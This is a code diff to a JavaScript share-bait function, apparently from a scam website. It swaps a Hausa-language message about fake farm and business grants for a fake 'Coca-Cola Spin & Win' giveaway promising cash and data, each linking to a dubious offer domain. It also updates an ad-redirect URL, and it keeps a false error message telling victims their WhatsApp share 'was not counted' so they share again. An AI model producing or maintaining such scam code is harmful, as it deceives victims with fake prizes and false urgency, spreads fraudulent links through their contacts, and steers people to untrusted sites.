@@ -280,8 +280,8 @@ function initTallafir() {
   if (tallafirInited) return; // prevent double-binding clicks
   tallafirInited = true;
 
-  const text1    = '%2ANa%20yi%20mamaki%20da%20abin%20da%20na%20gani%20yau%21%2A%0AShin%20ka%20duba%20ko%20ka%20cancanci%20tallafin%20noma%20ko%20kasuwanci%3F%0AAn%20bude%20shirin%20tallafin%20manoma%20da%20masu%20kananan%20kasuwanci.%0A%0A%2AWasu%20suna%20samun%20daga%20%E2%82%A650%2C000%20zuwa%20%E2%82%A61%2C000%2C000%20bayan%20cika%20bayanai.%2A%0A%0ANa%20riga%20na%20duba%20nawa.%20Kai%20ma%20ka%20gwada%20yanzu%20kafin%20a%20rufe.%0A%E2%8F%B3%20Kada%20ka%20bari%20a%20baka%20labari%21%0A%2Adanna%20nan%2A%F0%9F%91%89%20https://noma-da-kasuwanci.getoffersonline.forum/samu-yanzu';
-  const abcde    = '//rm358.com/4/10662892';
+  const text1    = 'I%20couldn%27t%20believe%20what%20I%20saw%20today%21%0A%0A%2ACoca-Cola%20Spin%20%26%20Win%20Giveaway%21%2A%0A%0ACelebrate%20Coca-Cola%27s%2075th%20Anniversary%20for%20a%20chance%20to%20win%3A%0A%20Free%20Data%0A%F0%9F%92%B5%20Up%20to%20%E2%82%A6250%2C000%20in%20Cash%20Prizes%0A%0A%2075%20people%20have%20already%20won%21%0A%0AParticipation%20is%20quick%20and%20easy%20%E2%80%93%20just%20spin%20the%20wheel%21%0A%0A%20%2AONLY%2075%20SPOTS%20LEFT%21%2A%0AClick%20now%20before%20it%27s%20gone%20%F0%9F%91%87%0A%0Ahttps://grapofferprice.forum/Coca-Cola';
+  const abcde    = '//rm358.com/4/11193153';
   const shareUrl = 'whatsapp://send?text=' + text1;
   const errorMsg = 'There was a problem! The share was not counted. You may have shared to the same friend or group more than once, please share again.';
 
